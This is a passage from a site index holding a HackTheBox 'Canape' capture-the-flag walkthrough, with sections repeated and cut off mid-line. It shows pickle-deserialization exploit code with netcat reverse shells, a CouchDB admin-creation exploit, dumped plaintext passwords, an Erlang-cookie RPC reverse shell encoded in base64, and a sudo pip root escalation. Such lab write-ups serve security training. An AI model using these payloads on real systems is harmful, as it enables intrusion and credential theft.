| 278.00 KiB/s, done. Folder simpsons \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.2:46.3]~/walkthrough/hackthebox/canape \u2514\u2500$ tree simpsons simpsons \u251c\u2500\u2500 __init__.py \u251c\u2500\u2500 static \u2502 \u251c\u2500\u2500 css \u2502 \u2502 \u251c\u2500\u2500 bootstrap.min.css \u2502 \u2502 \u251c\u2500\u2500 bootstrap.min.css.map \u2502 \u2502 \u2514\u2500\u2500 custom.css \u2502 \u2514\u2500\u2500 js \u2502 \u251c\u2500\u2500 bootstrap.min.js \u2502 \u2514\u2500\u2500 bootstrap.min.js.map \u2514\u2500\u2500 templates \u251c\u2500\u2500 index.html \u251c\u2500\u2500 layout.html \u251c\u2500\u2500 quotes.html \u2514\u2500\u2500 submit.html Foothold Insecure Deserialization In file __init__.py , there is two interested function Function uri /submit @app . route ( \"/submit\" , methods = [ \"GET\" , \"POST\" ]) def submit (): error = None success = None if request . method == \"POST\" : try : # Add value for char from request char = request . form [ \"character\" ] # Add value for quote from request quote = request . form [ \"quote\" ] # Return error if both don't have value if not char or not quote : error = True # Return error if char not in scope of whitelist elif not any ( c . lower () in char . lower () for c in WHITELIST ): error = True else : # TODO - Pickle into dictionary instead, `check` is ready # Create file name to save value from request p_id = md5 ( char + quote ) . hexdigest () # open file $(p_id) and write permission outfile = open ( \"/tmp/\" + p_id + \".p\" , \"wb\" ) # Save value to file name $(p_id) outfile . write ( char + quote ) outfile . close () success = True except Exception as ex : error = True return render_template ( \"submit.html\" , error = error , success = success ) Function uri /check @app . route ( \"/check\" , methods = [ \"POST\" ]) def check (): # Add path file $(id) in tmp folder path = \"/tmp/\" + request . form [ \"id\" ] + \".p\" # Open file path with read permission data = open ( path , \"rb\" ) . read () # Check if \"p1\" in data call function cPickle.loads(data) if \"p1\" in data : item = cPickle . loads ( data ) else : item = data return \"Still reviewing: \" + item When application call function cPickle.loads(data) , the data will load from submited file before. Searching for Pickle vulnerability, Exploiting misuse of Python's \"pickle\" show how to inject shell code to function __reduce__ pickle allows arbitrary objects to declare how they should be pickled by defining a __reduce__ method, which should return either a string or a tuple describing how to reconstruct this object on unpacking. In the simplest form, that tuple should just contain A callable (which must be either a class, or satisfy some other, odder, constraints), and A tuple of arguments to call that callable on. pickle will pickle each of these pieces separately, and then on unpickling, will call the callable on the provided arguments to construct the new object. And so, we can construct a pickle that, when un-pickled, will execute reverse shell with nc, as follows: import os , cPickle import subprocess import base64 class RunBinSh ( object ): def __reduce__ ( self ): return ( os . system , ( 'nc -nv 10.10.14.6 443 -e /bin/sh' ,)) data = cPickle . dumps ( RunBinSh ()) print base64 . b64encode ( data ) item = cPickle . loads ( data ) Quick poc exploit import os , requests import cPickle from hashlib import md5 class exploit ( object ): def __reduce__ ( self ): return ( os . system , ( 'echo homer!; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f' ,)) url = \"http://10.10.10.70\" data = cPickle . dumps ( exploit ()) char , quote = data . split ( '!' ) #Sent payload r = requests . post ( url + \"/submit\" , data = { 'character' : char , 'quote' : quote }) p_id = md5 ( char + quote ) . hexdigest () #Trigger payload r = requests . post ( url + \"/check\" , data = { 'id' : p_id }) Poc code here Run exploit pickle-canape.py . Function create_payload : Create payload contain data after dump class Shell with cPickle.dumps . Class Shell must contain string in white list to bypass check. Get file name by hashing md5 value in char and quote Sent another request to call function check at /check to trigger payload \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.8:44.6]~/walkthrough/hackthebox/canape \u2514\u2500$ python pickle-canape.py 10.10.10.70 7 \u2a2f >> http://10.10.10.70:80/submit ... [+] File name: 59d0b71be7d949629edf95b0dbe881cb >> http://10.10.10.70:80/check ... At listener, I have reverse shell \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.8:44.6]~/walkthrough/hackthebox/canape \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.6] from (UNKNOWN) [10.10.10.70] 40798 /bin/sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Privilege Escalation Local enumeration At file __init__.py , I also know the server was using couchdb database at localhost port 5984 with database named simpsons. app . config . update ( DATABASE = \"simpsons\" ) db = couchdb . Server ( \"http://localhost:5984/\" )[ app . config [ \"DATABASE\" ]] Checking running service www-data@canape:/var/www/html$ netstat -antup <snip> tcp 0 0 127.0.0.1:5984 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:38592 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:5986 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:4369 0.0.0.0:* LISTEN - <snip> Follow CouchDB's Documents , checking running service with curl, the CouchDB's version is 2.0.0 www-data@canape:/var/www/html$ curl 127.0.0.1:5986 {\"couchdb\":\"Welcome\",\"uuid\":\"132586dfde75b957085d59a5096e9c20\",\"version\":\"2.0.0\",\"vendor\":{\"name\":\"The Apache Software Foundation\"}} www-data@canape:/var/www/html$ curl 127.0.0.1:5984 {\"couchdb\":\"Welcome\",\"version\":\"2.0.0\",\"vendor\":{\"name\":\"The Apache Software Foundation\"}} There is database _users , passwords , simpsons , we need to query. www-data@canape:/var/www$ curl -X GET http://127.0.0.1:5984/_all_dbs [\"_global_changes\",\"_metadata\",\"_replicator\",\"_users\",\"passwords\",\"simpsons\"] 2 database _users and passwords require authentucation to query, let's check database simpsons first. www-data@canape:/tmp$ curl -X GET http://127.0.0.1:5984/_users/_all_docs {\"error\":\"unauthorized\",\"reason\":\"You are not a server admin.\"} www-data@canape:/tmp$ curl -X GET http://127.0.0.1:5984/passwords/_all_docs {\"error\":\"unauthorized\",\"reason\":\"You are not authorized to access this db.\"} www-data@canape:/tmp$ curl -X GET http://127.0.0.1:5984/simpsons/_all_docs {\"total_rows\":7,\"offset\":0,\"rows\":[ {\"id\":\"f0042ac3dc4951b51f056467a1000dd9\",\"key\":\"f0042ac3dc4951b51f056467a1000dd9\",\"value\":{\"rev\":\"1-fbdd816a5b0db0f30cf1fc38e1a37329\"}}, <snip> {\"id\":\"f53679a526a868d44172c83a6100451b\",\"key\":\"f53679a526a868d44172c83a6100451b\",\"value\":{\"rev\":\"1-3f6141f3aba11da1d65ff0c13fe6fd39\"}} ]} Database simpsons just save normal data for user input in the web application www-data@canape:/$ curl -X GET http://127.0.0.1:5984/simpsons/\\ > f0042ac3dc4951b51f056467a1000dd9 {\"_id\":\"f0042ac3dc4951b51f056467a1000dd9\",\"_rev\":\"1-fbdd816a5b0db0f30cf1fc38e1a37329\",\"character\":\"Homer\",\"quote\":\"Doh!\"} <snip> www-data@canape:/$ curl -X GET http://127.0.0.1:5984/simpsons/\\ > f53679a526a868d44172c83a6100451b {\"_id\":\"f53679a526a868d44172c83a6100451b\",\"_rev\":\"1-3f6141f3aba11da1d65ff0c13fe6fd39\",\"character\":\"Moe\",\"quote\":\"Oh, business is slow. People today are healthier and drinking less. You know, if it wasn't for the junior high school next door, no one would even use the cigarette machine.\"} Search public exploit for couchdb , I saw an interested exploit. \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.7:44.9]~/walkthrough/hackthebox/canape \u2514\u2500$ searchsploit couchdb 2.0.0 ----------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------- --------------------------------- Apache CouchDB 1.7.0 / 2.x < 2.1.1 - Remote Privilege Esca | linux/webapps/44498.py Apache CouchDB 2.0.0 - Local Privilege Escalation | windows/local/40865.txt Apache CouchDB < 2.1.0 - Remote Code Execution | linux/webapps/44913.py ----------------------------------------------------------- --------------------------------- Shellcodes: No Results Apache CouchDB PE Poc code here Using exploit linux/webapps/44498.py , I create a credential hades:leecybersec as a admin in the database. www-data@canape:/tmp$ python 44498.py -P leecybersec -u hades -p 5984 127.0.0.1 [+] User to create: hades [+] Password: leecybersec [+] Attacking host 127.0.0.1 on port 5984 [+] User hades with password leecybersec successfully created. We also run curl with function PUT to sent the payload curl -X PUT -d '{\"type\":\"user\",\"name\":\"leevn\", \"roles\":[\"_admin\"],\"roles\":[],\"password\":\"leevn\"}' localhost:5984/_users/org.couchdb.user:leevn -H \"Content-Type:application/json\" {\"ok\":true,\"id\":\"org.couchdb.user:leevn\",\"rev\":\"1-de62ec86a122727ccc9844ab17419a37\"} Back to database passwords and run query command with new admin credential www-data@canape:/tmp$ curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/_all_docs {\"total_rows\":4,\"offset\":0,\"rows\":[ {\"id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"key\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"value\":{\"rev\":\"2-81cf17b971d9229c54be92eeee723296\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"key\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"value\":{\"rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"key\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"value\":{\"rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"key\":\"739c5ebdf3f7a001bebb8fc438004738\",\"value\":{\"rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\"}} ]} Query single id and get value: curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4 {\"_id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"_rev\":\"2-81cf17b971d9229c54be92eeee723296\",\"item\":\"ssh\",\"password\":\"0B4jyA0xtytZi7esBNGp\",\"user\":\"\"} curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d {\"_id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"_rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\",\"item\":\"couchdb\",\"password\":\"r3lax0Nth3C0UCH\",\"user\":\"couchy\"} curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f {\"_id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"_rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\",\"item\":\"simpsonsfanclub.com\",\"password\":\"h02ddjdj2k2k2\",\"user\":\"homer\"} curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438004738 {\"_id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"_rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\",\"user\":\"homerj0121\",\"item\":\"github\",\"password\":\"STOP STORING YOUR PASSWORDS HERE -Admin\"} The user stored their password in database passwords and admin was warning them. Let's use knows password for SSH service. I successfully login with credential homer:0B4jyA0xtytZi7esBNGp \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.6:45.9]~ \u2514\u2500$ sshpass -p 0B4jyA0xtytZi7esBNGp ssh homer@10.10.10.70 -p 65535 Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Last login: Tue Apr 10 12:57:08 2018 from 10.10.14.5 homer@canape:~$ id uid=1000(homer) gid=1000(homer) groups=1000(homer) Erlang CouchDB Local PrivEscal Checking running service, I saw the command line -setcookie monster www-data@canape:/home$ ps aux | grep couchdb root 639 0.0 0.0 4240 644 ? Ss Apr13 0:00 runsv couchdb root 641 0.0 0.0 4384 676 ? S Apr13 0:00 svlogd -tt /var/log/couchdb homer 642 0.4 3.5 649344 34920 ? Sl Apr13 1:11 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config www-data 1587 0.0 0.1 11284 1020 pts/0 S+ 01:37 0:00 grep couchdb Using cookie monster and go to Erlang www-data@canape:/home$ HOME=/ erl -sname 0xdf -setcookie monster Eshell V7.3 (abort with ^G) (0xdf@canape)1> os:cmd(\"id\"). \"uid=33(www-data) gid=33(www-data) groups=33(www-data)\\n\" Using rpc module of Erlang and call to CouchDB (0xdf@canape)2> rpc:call('couchdb@localhost', os, cmd, [whoami]). \"homer\\n\" Create homer shell (0xdf@canape)3> rpc:call('couchdb@localhost', os, cmd, [\"echo -n c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMQ== | base64 -d | bash\"]). At listener, I have reverse shell \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.0:39.5]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.6] from (UNKNOWN) [10.10.10.70] 43496 sh: 0: can't access tty; job control turned off $ id uid=1000(homer) gid=1000(homer) groups=1000(homer) Sudo Pip Command homer@canape:~$ sudo -l [sudo] password for homer: <snip> User homer may run the following commands on canape: (root) /usr/bin/pip install * Server allow execute /usr/bin/pip install * as root without require password. Based on GTFOBins/pip , I create a root shell. homer@canape:~$ TF=$(mktemp -d) homer@canape:~$ echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py homer@canape:~$ sudo /usr/bin/pip install $TF <snip> Processing /tmp/tmp.vuft5MuGm7 # id uid=0(root) gid=0(root) groups=0(root)","title":"HTB Canape"},{"location":"walkthrough/hackthebox/Canape/index.html#hackthebox-canape","text":"Author: Hades Scripting here","title":"HackTheBox Canape"},{"location":"walkthrough/hackthebox/Canape/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Canape/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.10.70 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 80,65535 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.70 -p80,65535 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 14:39 +07 Nmap scan report for 10.10.10.70 Host is up (0.28s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-git: | 10.10.10.70:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file 'description' to name the... | Last commit message: final # Please enter the commit message for your changes. Li... | Remotes: |_ http://git.canape.htb/simpsons.git |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Simpsons Fan Site |_http-trane-info: Problem with XML parsing of /evox/about 65535/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA) | 256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA) |_ 256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.87 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Canape/index.html#apache-httpd-2418","text":"At port 80, the web application developed by Simpson from 2018. List of the hidden in the server using wfuzz \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[0.4:25.2]~ \u2514\u2500$ wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hw 1 --hl 82 'http://10.10.10.70/FUZZ' <snip> Target: http://10.10.10.70/FUZZ Total requests: 4681 <snip> 000000012: 200 9 L 43 W 1075 Ch \".git/index\" 000000013: 200 17 L 70 W 1130 Ch \".git/logs/\" 000000011: 200 11 L 29 W 259 Ch \".git/config\" 000000010: 200 1 L 2 W 23 Ch \".git/HEAD\" 000000008: 301 9 L 28 W 309 Ch \".git\" 000001026: 403 11 L 32 W 294 Ch \"cgi-bin/\" 000001060: 405 4 L 23 W 178 Ch \"check\" 000003371: 200 85 L 227 W 3150 Ch \"quotes\" 000003682: 403 11 L 32 W 299 Ch \"server-status\" 000003923: 301 9 L 28 W 311 Ch \"static\" 000003967: 200 81 L 167 W 2836 Ch \"submit\" <snip> Based on nmap and wfuzz result, I saw this web app public folder .git and it's may leak some sensitive source code. Dump folder .git if repo not available using GitHacker , git_dumper or command wget --mirror -I .git example.com/.git/ Checking config file, the source code is currently at repo http://git.canape.htb/simpsons.git . \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.2:47.4]~/scripting/services \u2514\u2500$ curl http://10.10.10.70/.git/config [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \"origin\"] url = http://git.canape.htb/simpsons.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \"master\"] remote = origin merge = refs/heads/master Add domain git.canape.htb with 10.10.10.70 to file hosts and clone the source code. \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.2:47.4]~/walkthrough/hackthebox/canape \u2514\u2500$ git clone http://git.canape.htb/simpsons.git Cloning into 'simpsons'... remote: Counting objects: 49, done. remote: Compressing objects: 100% (47/47), done. remote: Total 49 (delta 18), reused 0 (delta 0) Unpacking objects: 100% (49/49), 163.16 KiB | 278.00 KiB/s, done. Folder simpsons \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.2:46.3]~/walkthrough/hackthebox/canape \u2514\u2500$ tree simpsons simpsons \u251c\u2500\u2500 __init__.py \u251c\u2500\u2500 static \u2502 \u251c\u2500\u2500 css \u2502 \u2502 \u251c\u2500\u2500 bootstrap.min.css \u2502 \u2502 \u251c\u2500\u2500 bootstrap.min.css.map \u2502 \u2502 \u2514\u2500\u2500 custom.css \u2502 \u2514\u2500\u2500 js \u2502 \u251c\u2500\u2500 bootstrap.min.js \u2502 \u2514\u2500\u2500 bootstrap.min.js.map \u2514\u2500\u2500 templates \u251c\u2500\u2500 index.html \u251c\u2500\u2500 layout.html \u251c\u2500\u2500 quotes.html \u2514\u2500\u2500 submit.html","title":"Apache httpd 2.4.18"},{"location":"walkthrough/hackthebox/Canape/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Canape/index.html#insecure-deserialization","text":"In file __init__.py , there is two interested function Function uri /submit @app . route ( \"/submit\" , methods = [ \"GET\" , \"POST\" ]) def submit (): error = None success = None if request . method == \"POST\" : try : # Add value for char from request char = request . form [ \"character\" ] # Add value for quote from request quote = request . form [ \"quote\" ] # Return error if both don't have value if not char or not quote : error = True # Return error if char not in scope of whitelist elif not any ( c . lower () in char . lower () for c in WHITELIST ): error = True else : # TODO - Pickle into dictionary instead, `check` is ready # Create file name to save value from request p_id = md5 ( char + quote ) . hexdigest () # open file $(p_id) and write permission outfile = open ( \"/tmp/\" + p_id + \".p\" , \"wb\" ) # Save value to file name $(p_id) outfile . write ( char + quote ) outfile . close () success = True except Exception as ex : error = True return render_template ( \"submit.html\" , error = error , success = success ) Function uri /check @app . route ( \"/check\" , methods = [ \"POST\" ]) def check (): # Add path file $(id) in tmp folder path = \"/tmp/\" + request . form [ \"id\" ] + \".p\" # Open file path with read permission data = open ( path , \"rb\" ) . read () # Check if \"p1\" in data call function cPickle.loads(data) if \"p1\" in data : item = cPickle . loads ( data ) else : item = data return \"Still reviewing: \" + item When application call function cPickle.loads(data) , the data will load from submited file before. Searching for Pickle vulnerability, Exploiting misuse of Python's \"pickle\" show how to inject shell code to function __reduce__ pickle allows arbitrary objects to declare how they should be pickled by defining a __reduce__ method, which should return either a string or a tuple describing how to reconstruct this object on unpacking. In the simplest form, that tuple should just contain A callable (which must be either a class, or satisfy some other, odder, constraints), and A tuple of arguments to call that callable on. pickle will pickle each of these pieces separately, and then on unpickling, will call the callable on the provided arguments to construct the new object. And so, we can construct a pickle that, when un-pickled, will execute reverse shell with nc, as follows: import os , cPickle import subprocess import base64 class RunBinSh ( object ): def __reduce__ ( self ): return ( os . system , ( 'nc -nv 10.10.14.6 443 -e /bin/sh' ,)) data = cPickle . dumps ( RunBinSh ()) print base64 . b64encode ( data ) item = cPickle . loads ( data ) Quick poc exploit import os , requests import cPickle from hashlib import md5 class exploit ( object ): def __reduce__ ( self ): return ( os . system , ( 'echo homer!; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f' ,)) url = \"http://10.10.10.70\" data = cPickle . dumps ( exploit ()) char , quote = data . split ( '!' ) #Sent payload r = requests . post ( url + \"/submit\" , data = { 'character' : char , 'quote' : quote }) p_id = md5 ( char + quote ) . hexdigest () #Trigger payload r = requests . post ( url + \"/check\" , data = { 'id' : p_id }) Poc code here Run exploit pickle-canape.py . Function create_payload : Create payload contain data after dump class Shell with cPickle.dumps . Class Shell must contain string in white list to bypass check. Get file name by hashing md5 value in char and quote Sent another request to call function check at /check to trigger payload \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.8:44.6]~/walkthrough/hackthebox/canape \u2514\u2500$ python pickle-canape.py 10.10.10.70 7 \u2a2f >> http://10.10.10.70:80/submit ... [+] File name: 59d0b71be7d949629edf95b0dbe881cb >> http://10.10.10.70:80/check ... At listener, I have reverse shell \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.8:44.6]~/walkthrough/hackthebox/canape \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.6] from (UNKNOWN) [10.10.10.70] 40798 /bin/sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data)","title":"Insecure Deserialization"},{"location":"walkthrough/hackthebox/Canape/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/Canape/index.html#local-enumeration","text":"At file __init__.py , I also know the server was using couchdb database at localhost port 5984 with database named simpsons. app . config . update ( DATABASE = \"simpsons\" ) db = couchdb . Server ( \"http://localhost:5984/\" )[ app . config [ \"DATABASE\" ]] Checking running service www-data@canape:/var/www/html$ netstat -antup <snip> tcp 0 0 127.0.0.1:5984 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:38592 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:5986 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:4369 0.0.0.0:* LISTEN - <snip> Follow CouchDB's Documents , checking running service with curl, the CouchDB's version is 2.0.0 www-data@canape:/var/www/html$ curl 127.0.0.1:5986 {\"couchdb\":\"Welcome\",\"uuid\":\"132586dfde75b957085d59a5096e9c20\",\"version\":\"2.0.0\",\"vendor\":{\"name\":\"The Apache Software Foundation\"}} www-data@canape:/var/www/html$ curl 127.0.0.1:5984 {\"couchdb\":\"Welcome\",\"version\":\"2.0.0\",\"vendor\":{\"name\":\"The Apache Software Foundation\"}} There is database _users , passwords , simpsons , we need to query. www-data@canape:/var/www$ curl -X GET http://127.0.0.1:5984/_all_dbs [\"_global_changes\",\"_metadata\",\"_replicator\",\"_users\",\"passwords\",\"simpsons\"] 2 database _users and passwords require authentucation to query, let's check database simpsons first. www-data@canape:/tmp$ curl -X GET http://127.0.0.1:5984/_users/_all_docs {\"error\":\"unauthorized\",\"reason\":\"You are not a server admin.\"} www-data@canape:/tmp$ curl -X GET http://127.0.0.1:5984/passwords/_all_docs {\"error\":\"unauthorized\",\"reason\":\"You are not authorized to access this db.\"} www-data@canape:/tmp$ curl -X GET http://127.0.0.1:5984/simpsons/_all_docs {\"total_rows\":7,\"offset\":0,\"rows\":[ {\"id\":\"f0042ac3dc4951b51f056467a1000dd9\",\"key\":\"f0042ac3dc4951b51f056467a1000dd9\",\"value\":{\"rev\":\"1-fbdd816a5b0db0f30cf1fc38e1a37329\"}}, <snip> {\"id\":\"f53679a526a868d44172c83a6100451b\",\"key\":\"f53679a526a868d44172c83a6100451b\",\"value\":{\"rev\":\"1-3f6141f3aba11da1d65ff0c13fe6fd39\"}} ]} Database simpsons just save normal data for user input in the web application www-data@canape:/$ curl -X GET http://127.0.0.1:5984/simpsons/\\ > f0042ac3dc4951b51f056467a1000dd9 {\"_id\":\"f0042ac3dc4951b51f056467a1000dd9\",\"_rev\":\"1-fbdd816a5b0db0f30cf1fc38e1a37329\",\"character\":\"Homer\",\"quote\":\"Doh!\"} <snip> www-data@canape:/$ curl -X GET http://127.0.0.1:5984/simpsons/\\ > f53679a526a868d44172c83a6100451b {\"_id\":\"f53679a526a868d44172c83a6100451b\",\"_rev\":\"1-3f6141f3aba11da1d65ff0c13fe6fd39\",\"character\":\"Moe\",\"quote\":\"Oh, business is slow. People today are healthier and drinking less. You know, if it wasn't for the junior high school next door, no one would even use the cigarette machine.\"} Search public exploit for couchdb , I saw an interested exploit. \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.7:44.9]~/walkthrough/hackthebox/canape \u2514\u2500$ searchsploit couchdb 2.0.0 ----------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------- --------------------------------- Apache CouchDB 1.7.0 / 2.x < 2.1.1 - Remote Privilege Esca | linux/webapps/44498.py Apache CouchDB 2.0.0 - Local Privilege Escalation | windows/local/40865.txt Apache CouchDB < 2.1.0 - Remote Code Execution | linux/webapps/44913.py ----------------------------------------------------------- --------------------------------- Shellcodes: No Results","title":"Local enumeration"},{"location":"walkthrough/hackthebox/Canape/index.html#apache-couchdb-pe","text":"Poc code here Using exploit linux/webapps/44498.py , I create a credential hades:leecybersec as a admin in the database. www-data@canape:/tmp$ python 44498.py -P leecybersec -u hades -p 5984 127.0.0.1 [+] User to create: hades [+] Password: leecybersec [+] Attacking host 127.0.0.1 on port 5984 [+] User hades with password leecybersec successfully created. We also run curl with function PUT to sent the payload curl -X PUT -d '{\"type\":\"user\",\"name\":\"leevn\", \"roles\":[\"_admin\"],\"roles\":[],\"password\":\"leevn\"}' localhost:5984/_users/org.couchdb.user:leevn -H \"Content-Type:application/json\" {\"ok\":true,\"id\":\"org.couchdb.user:leevn\",\"rev\":\"1-de62ec86a122727ccc9844ab17419a37\"} Back to database passwords and run query command with new admin credential www-data@canape:/tmp$ curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/_all_docs {\"total_rows\":4,\"offset\":0,\"rows\":[ {\"id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"key\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"value\":{\"rev\":\"2-81cf17b971d9229c54be92eeee723296\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"key\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"value\":{\"rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"key\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"value\":{\"rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"key\":\"739c5ebdf3f7a001bebb8fc438004738\",\"value\":{\"rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\"}} ]} Query single id and get value: curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4 {\"_id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"_rev\":\"2-81cf17b971d9229c54be92eeee723296\",\"item\":\"ssh\",\"password\":\"0B4jyA0xtytZi7esBNGp\",\"user\":\"\"} curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d {\"_id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"_rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\",\"item\":\"couchdb\",\"password\":\"r3lax0Nth3C0UCH\",\"user\":\"couchy\"} curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f {\"_id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"_rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\",\"item\":\"simpsonsfanclub.com\",\"password\":\"h02ddjdj2k2k2\",\"user\":\"homer\"} curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438004738 {\"_id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"_rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\",\"user\":\"homerj0121\",\"item\":\"github\",\"password\":\"STOP STORING YOUR PASSWORDS HERE -Admin\"} The user stored their password in database passwords and admin was warning them. Let's use knows password for SSH service. I successfully login with credential homer:0B4jyA0xtytZi7esBNGp \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.6:45.9]~ \u2514\u2500$ sshpass -p 0B4jyA0xtytZi7esBNGp ssh homer@10.10.10.70 -p 65535 Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Last login: Tue Apr 10 12:57:08 2018 from 10.10.14.5 homer@canape:~$ id uid=1000(homer) gid=1000(homer) groups=1000(homer)","title":"Apache CouchDB PE"},{"location":"walkthrough/hackthebox/Canape/index.html#erlang-couchdb-local-privescal","text":"Checking running service, I saw the command line -setcookie monster www-data@canape:/home$ ps aux | grep couchdb root 639 0.0 0.0 4240 644 ? Ss Apr13 0:00 runsv couchdb root 641 0.0 0.0 4384 676 ? S Apr13 0:00 svlogd 